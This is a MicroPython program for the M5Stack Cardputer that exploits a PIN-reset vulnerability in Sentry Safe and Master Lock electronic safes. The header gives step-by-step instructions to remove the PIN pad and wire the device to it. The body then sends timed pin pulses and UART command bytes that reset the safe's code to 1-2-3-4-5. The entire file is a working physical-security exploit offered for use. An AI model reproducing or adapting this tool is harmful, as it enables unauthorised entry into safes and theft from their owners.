#Program for the M5 Stack Cardputer, to take advantage of the Sentry Safe & Master Lock safe
#PIN reset vulnerability. Meant to be run in MicroHydra.
#Instructions: Unscrew a screw near the bottom of the PIN pad. Twist off/remove the PIN pad section to expose the wires.
#Connect black wire behind PIN pad to GND on Cardputer.
#Connect green wire behind PIN pad to G1 on Cardputer.
#Coded by Spaceherb. SentrySafeCardputer Version 1.0.

import time
from machine import Pin, freq, reset, UART
from lib.userinput import UserInput
from font import vga1_8x16 as font2
from lib.display import Display
from lib.hydra.config import Config
from neopixel import NeoPixel


neopin = 21
numleds = 1
neopix = NeoPixel(Pin(neopin, Pin.OUT), numleds)

kb = UserInput()
config2 = Config()

display2 = Display(use_tiny_buf=True)
blight = display2.backlight
blight.freq(1000)
blight.duty_u16(40000)

uart = UART(1, baudrate=4800, bits=8, parity=0, stop=1, tx=Pin(1), rx=Pin(2))
#Apparently uart.init() is not required right here. Only required if
#you use Pin.OUT and pin.on/off() first then you have to init UART after to reinitialize the UART stream.
#uart.init(bits=8, parity=None, stop=1)

#ir = Pin(44, Pin.OUT)

def main():
    #This function waits for a key to be pressed, and then sends the appropriate UART signals and pin timings.
    global neopix
    
    redcolor = (255, 0, 0)
    greencolor = (0, 255, 0)
    
    pin1 = Pin(1, Pin.OUT)
    
    keys = []
    display2.fill(config2.palette[3])
    display2.text("Press any key", 10, 10, config2.palette[9], font=font2)
    display2.text("  to send signal", 10, 20, config2.palette[9], font=font2)
    display2.text("Connect G1 on Cardputer", 10, 45, config2.palette[10], font=font2)
    display2.text("   to green wire", 10, 55, config2.palette[10], font=font2)
    display2.text("Connect GND on Cardputer", 10, 75, config2.palette[10], font=font2)
    display2.text("   to black wire", 10, 85, config2.palette[10], font=font2)
    display2.show()

    #Sometimes get_pressed_keys() & get_new_keys() works for the top
    #two rows of Cardputer keys only. I am unsure what causes this.
    keys = kb.get_pressed_keys()

    if keys:
        display2.fill(config2.palette[7])
        display2.show()

        #This section exists because without it, the timings of the on() and off() commands would not be correct.
        #A sleep of 0.2ms was closer to 1.5.ms
        #For some reason, executing a uart.init() beforehand, allows the
        #time.sleep() function to be more precise.
        uart.init()
        
        time.sleep(0.2)

        #pin1.value(0) may also work
        pin1 = Pin(1, Pin.OUT)
        pin1.off()
        time.sleep(0.002750)
        pin1.on()
        time.sleep(0.000200)
        
        pin1 = Pin(1)
        uart.init()

        #b'1' and '1' send ASCII 1, not hex. b'\x01' is the byte 01
        
        uart.write(b'\x00')
        
        uart.write(b'\x75')
        uart.write(b'\x01')
        uart.write(b'\x02')
        uart.write(b'\x03')
        uart.write(b'\x04')
        uart.write(b'\x05')
        #Checksum byte is 75 plus 15 in hex
        uart.write(b'\x84')

        time.sleep(0.2)

        pin1 = Pin(1, Pin.OUT)
        pin1.off()
        time.sleep(0.002750)
        pin1.on()
        time.sleep(0.000200)
        
        pin1 = Pin(1)
        uart.init()
        
        uart.write(b'\x00')
        
        uart.write(b'\x71')
        uart.write(b'\x01')
        uart.write(b'\x02')
        uart.write(b'\x03')
        uart.write(b'\x04')
        uart.write(b'\x05')
        #Checksum byte is 71 plus 15 in hex
        uart.write(b'\x80')
        
        display2.text("Signal sent", 10, 20, config2.palette[10], font=font2)
        display2.show()
        
        neopix[0] = greencolor
        neopix.write()
        
        time.sleep(3)
        
        neopix[0] = (0, 0, 0)
        neopix.write()
        
        keys = []

    else:
        keys = []
        return

#Intro
display2.fill(config2.palette[0])
display2.text("Coded by Spaceherb", 25, 60, config2.palette[9], font=font2)
display2.show()
time.sleep(2)
    
while True:
    main()
